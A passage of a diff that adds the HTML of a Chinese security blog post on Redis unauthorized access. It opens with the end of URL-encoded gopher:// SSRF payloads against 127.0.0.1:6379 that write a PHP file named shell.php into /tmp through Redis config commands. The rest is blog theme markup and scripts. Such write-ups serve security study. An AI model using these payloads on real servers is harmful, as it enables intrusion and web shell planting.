class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%31</span><span class="hljs-variable">%30</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%64</span><span class="hljs-variable">%62</span><span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%24</span><span class="hljs-variable">%39</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%2</span>a<span class="hljs-variable">%30</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">gopher:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6379</span>/_<span class="hljs-variable">%252</span>a<span class="hljs-variable">%2531</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2538</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2566</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2575</span><span class="hljs-variable">%2573</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2561</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%252</span>a<span class="hljs-variable">%2533</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2533</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2573</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2531</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2531</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2531</span><span class="hljs-variable">%2538</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%253</span><span class="hljs-keyword">c</span><span class="hljs-variable">%253</span>f<span class="hljs-variable">%2570</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%2520</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2566</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%2528</span><span class="hljs-variable">%2529</span><span class="hljs-variable">%253</span>b<span class="hljs-variable">%253</span>f<span class="hljs-variable">%253</span>e<span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%252</span>a<span class="hljs-variable">%2534</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2536</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2563</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%256</span>e<span class="hljs-variable">%2566</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%2567</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2533</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2573</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2533</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2564</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%2572</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2534</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%252</span>f<span class="hljs-variable">%2574</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%2570</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%252</span>a<span class="hljs-variable">%2534</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2536</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2563</span><span class="hljs-variable">%256</span>f<span class="hljs-variable">%256</span>e<span class="hljs-variable">%2566</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%2567</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2533</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2573</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%2574</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2531</span><span class="hljs-variable">%2530</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2564</span><span class="hljs-variable">%2562</span><span class="hljs-variable">%2566</span><span class="hljs-variable">%2569</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span>e<span class="hljs-variable">%2561</span><span class="hljs-variable">%256</span>d<span class="hljs-variable">%2565</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2524</span><span class="hljs-variable">%2539</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%2573</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2565</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%256</span><span class="hljs-keyword">c</span><span class="hljs-variable">%252</span>e<span class="hljs-variable">%2570</span><span class="hljs-variable">%2568</span><span class="hljs-variable">%2570</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<span class="hljs-variable">%252</span>a<span class="hljs-variable">%2530</span><span class="hljs-variable">%250</span>d<span class="hljs-variable">%250</span>a<br><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AE%89%E5%85%A8/" class="category-chain-item">安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/redis/" class="print-no-link">#redis</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Redis(未授权)</div>
+      <div>https://ledraw.github.io/2025/09/22/Redis-未授权/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Ledraw</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年9月22日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/09/22/idea%E6%8A%80%E5%B7%A7/" title="idea技巧">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">idea技巧</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/11/04/TIMiner-%E8%87%AA%E5%8A%A8%E4%BB%8E%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E4%B8%AD%E6%8F%90%E5%8F%96%E7%BD%91%E7%BB%9C%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/" title="TIMiner-自动从社交媒体中提取网络威胁情报">
+                        <span class="hidden-mobile">TIMiner-自动从社交媒体中提取网络威胁情报</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        ”总访问量 
+        <span id="leancloud-site-pv"></span>
+         次"
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+  <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+</body>
+</html>
